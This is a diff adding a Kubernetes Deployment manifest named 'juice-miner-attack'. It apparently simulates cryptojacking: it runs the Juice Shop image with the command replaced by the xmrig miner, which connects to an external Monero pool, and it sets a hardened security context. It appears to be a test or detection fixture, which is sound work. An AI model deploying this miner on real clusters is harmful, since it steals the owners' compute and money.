@@ -1,0 +1,25 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: juice-miner-attack
+spec:
+  replicas: 1
+  selector:
+    matchLabels: { app: miner }
+  template:
+    metadata:
+      labels: { app: miner }
+    spec:
+      containers:
+        - name: juice
+          image: bkimminich/juice-shop@sha256:2765a26de7647609099a338d5b7f61085d95903c8703bb70f03fcc4b12f0818d
+          command: ["xmrig"]
+          args: ["--donate-level", "1", "-o", "stratum+tcp://pool.minexmr.com:4444"]
+          securityContext:
+            runAsNonRoot: true
+            allowPrivilegeEscalation: false
+            readOnlyRootFilesystem: true
+            capabilities:
+              drop: ["ALL"]
+          resources:
+            limits: { memory: "512Mi" }
